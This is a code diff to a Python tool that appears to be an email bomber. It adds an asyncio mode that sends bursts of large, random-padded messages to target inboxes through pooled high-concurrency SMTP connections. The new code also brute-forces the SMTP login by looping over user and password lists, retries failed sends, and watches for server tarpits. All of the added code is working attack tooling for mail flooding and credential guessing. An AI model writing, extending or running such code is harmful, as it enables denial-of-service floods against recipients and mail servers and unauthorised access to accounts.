@@ -631,6 +631,11 @@ async def async_bombing_mode(
 ) -> None:
     """Asynchronous burst sending using ``asyncio``."""
 
+    # Native async mode using aiosmtplib (optional)
+    if getattr(cfg, "SB_ASYNC_NATIVE", False):
+        await _async_bombing_mode_native(cfg, attachments)
+        return
+
     logger.info("Generating %s of data to append to message", sizeof_fmt(cfg.SB_SIZE))
 
     class Counter:
@@ -667,6 +672,227 @@ async def async_bombing_mode(
                         passwords=cfg.SB_PASSLIST,
                     )
                 )
+            )
+        if tasks:
+            await asyncio.gather(*tasks)
+        await async_throttle(cfg, cfg.SB_BURSTSPSEC)
+
+    if cfg.SB_RAND_STREAM:
+        try:
+            cfg.SB_RAND_STREAM.close()
+        except Exception:
+            pass
+
+
+async def _async_sendmail_native(
+    number: int,
+    burst: int,
+    SB_FAILCOUNT,
+    SB_MESSAGE: bytes,
+    cfg: Config,
+    *,
+    loop: asyncio.AbstractEventLoop | None = None,
+) -> None:
+    """Send a single email using aiosmtplib."""
+    try:
+        import aiosmtplib  # type: ignore
+    except Exception:  # pragma: no cover - optional dependency may be missing
+        # Fallback to thread-based path
+        await async_sendmail(number, burst, SB_FAILCOUNT, SB_MESSAGE, cfg)
+        return
+
+    host, port = parse_server(cfg.SB_SERVER)
+    use_ssl = cfg.SB_SSL
+    start_tls = cfg.SB_STARTTLS
+    if SB_FAILCOUNT.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+        return
+    # Retry with exponential backoff and jitter
+    attempts = int(getattr(cfg, "SB_RETRY_COUNT", 0)) + 1
+    base = 0.2
+    for i in range(attempts):
+        try:
+            await async_throttle(cfg)
+            if use_ssl:
+                client = aiosmtplib.SMTP(
+                    hostname=host, port=port, timeout=cfg.SB_TIMEOUT, use_tls=True
+                )
+            else:
+                client = aiosmtplib.SMTP(
+                    hostname=host, port=port, timeout=cfg.SB_TIMEOUT
+                )
+            await client.connect()
+            if start_tls and not use_ssl:
+                await client.starttls()
+            if cfg.SB_HELO_HOST:
+                await client.ehlo(cfg.SB_HELO_HOST)
+            else:
+                await client.ehlo()
+            if cfg.SB_USERLIST and cfg.SB_PASSLIST:
+                for user in cfg.SB_USERLIST:
+                    success = False
+                    for pwd in cfg.SB_PASSLIST:
+                        try:
+                            await client.login(user, pwd)
+                            success = True
+                            break
+                        except Exception:
+                            continue
+                    if success:
+                        break
+            start_t = time.monotonic()
+            await client.sendmail(cfg.SB_SENDER, cfg.SB_RECEIVERS, SB_MESSAGE)
+            latency = time.monotonic() - start_t
+            if latency > cfg.SB_TARPIT_THRESHOLD:
+                logger.warning("Possible tarpit detected: %.2fs latency", latency)
+            await client.quit()
+            logger.info("%s/%s, Burst %s : Email Sent", number, cfg.SB_TOTAL, burst)
+            return
+        except Exception:
+            if i < attempts - 1:
+                # jittered backoff
+                delay = base * (2**i)
+                try:
+                    await asyncio.sleep(delay)
+                except Exception:
+                    pass
+                continue
+            _increment(SB_FAILCOUNT)
+            logger.error(
+                "%s/%s, Burst %s/%s : Failure %s/%s, Unable to send email",
+                number,
+                cfg.SB_TOTAL,
+                burst,
+                cfg.SB_BURSTS,
+                SB_FAILCOUNT.value,
+                cfg.SB_STOPFQNT,
+            )
+
+
+async def _async_bombing_mode_native(
+    cfg: Config, attachments: Optional[List[str]] = None
+) -> None:
+    """Native asyncio sending using aiosmtplib with concurrency limiting."""
+    logger.info("Generating %s of data to append to message", sizeof_fmt(cfg.SB_SIZE))
+
+    class Counter:
+        def __init__(self):
+            self.value = 0
+
+    fail_count = Counter()
+    message = append_message(cfg, attachments)
+    logger.info("Message using %s of random data", sizeof_fmt(sys.getsizeof(message)))
+
+    sem = asyncio.Semaphore(max(1, int(getattr(cfg, "SB_ASYNC_CONCURRENCY", 100))))
+
+    # Optional connection pool for reuse
+    pool_q: asyncio.Queue | None = None
+    try:
+        import aiosmtplib  # type: ignore
+    except Exception:  # pragma: no cover - optional dependency
+        aiosmtplib = None  # type: ignore
+
+    if aiosmtplib is not None and getattr(cfg, "SB_ASYNC_REUSE", True):
+        pool_q = asyncio.Queue()
+        host, port = parse_server(cfg.SB_SERVER)
+        use_ssl = cfg.SB_SSL
+        pool_size = max(
+            1,
+            min(
+                int(getattr(cfg, "SB_ASYNC_POOL_SIZE", 10)),
+                int(getattr(cfg, "SB_ASYNC_CONCURRENCY", 100)),
+            ),
+        )
+
+        async def _make_client():
+            if use_ssl:
+                c = aiosmtplib.SMTP(
+                    hostname=host, port=port, timeout=cfg.SB_TIMEOUT, use_tls=True
+                )
+            else:
+                c = aiosmtplib.SMTP(hostname=host, port=port, timeout=cfg.SB_TIMEOUT)
+            await c.connect()
+            if cfg.SB_STARTTLS and not use_ssl:
+                await c.starttls()
+            if cfg.SB_HELO_HOST:
+                await c.ehlo(cfg.SB_HELO_HOST)
+            else:
+                await c.ehlo()
+            return c
+
+        for _ in range(pool_size):
+            try:
+                client = await _make_client()
+                await pool_q.put(client)
+            except Exception:
+                # If we fail to prewarm some connections, the worker will fall back
+                pass
+
+        async def _client_factory():
+            # Dequeue a client or create a new one
+            if pool_q and not pool_q.empty():
+                return await pool_q.get()
+            return await _make_client()
+
+    async def worker(number: int, burst: int) -> None:
+        async with sem:
+            if pool_q is None:
+                await _async_sendmail_native(number, burst, fail_count, message, cfg)
+            else:
+                # Use pooled client
+                client = await _client_factory()
+                try:
+                    # Health check the pooled client
+                    try:
+                        if hasattr(client, "noop"):
+                            await client.noop()
+                    except Exception:
+                        # Recreate unhealthy client
+                        client = await _client_factory()
+                    start_t = time.monotonic()
+                    await client.sendmail(cfg.SB_SENDER, cfg.SB_RECEIVERS, message)
+                    latency = time.monotonic() - start_t
+                    if latency > cfg.SB_TARPIT_THRESHOLD:
+                        logger.warning(
+                            "Possible tarpit detected: %.2fs latency", latency
+                        )
+                    logger.info(
+                        "%s/%s, Burst %s : Email Sent", number, cfg.SB_TOTAL, burst
+                    )
+                except Exception:
+                    _increment(fail_count)
+                    logger.error(
+                        "%s/%s, Burst %s/%s : Failure %s/%s, Unable to send email",
+                        number,
+                        cfg.SB_TOTAL,
+                        burst,
+                        cfg.SB_BURSTS,
+                        fail_count.value,
+                        cfg.SB_STOPFQNT,
+                    )
+                finally:
+                    # Return client to pool or close if not reusable
+                    if pool_q is not None:
+                        try:
+                            await pool_q.put(client)
+                        except Exception:
+                            try:
+                                await client.quit()
+                            except Exception:
+                                pass
+
+    for b in range(cfg.SB_BURSTS):
+        if cfg.SB_PER_BURST_DATA:
+            message = append_message(cfg, attachments)
+        numbers = range(1, cfg.SB_SGEMAILS + 1)
+        tasks = []
+        if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+            break
+        for number in numbers:
+            if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+                break
+            await async_throttle(cfg, cfg.SB_SGEMAILSPSEC)
+            tasks.append(
+                asyncio.create_task(worker(number + (b * cfg.SB_SGEMAILS), b + 1))
             )
         if tasks:
             await asyncio.gather(*tasks)
